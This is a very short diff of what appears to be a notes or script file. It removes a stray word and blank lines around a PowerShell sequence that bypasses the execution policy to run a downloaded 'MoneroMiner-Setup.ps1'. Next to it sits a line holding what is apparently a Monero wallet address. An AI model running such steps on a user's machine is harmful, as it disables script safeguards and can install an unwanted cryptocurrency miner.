@@ -1,9 +1,5 @@
 kkk:49VoPExPniBCmyuoVauuQSZjbwjLudMCC4CdHdNBeYTwi74iurwLCeoigLVZWCGWeJYVwTMWZEqhtALj3gEU2ichBhzqydk
- ibiy
-
-
-
-
 cd "$HOME\Downloads"
 Set-ExecutionPolicy -Scope Process Bypass
 .\MoneroMiner-Setup.ps1
+
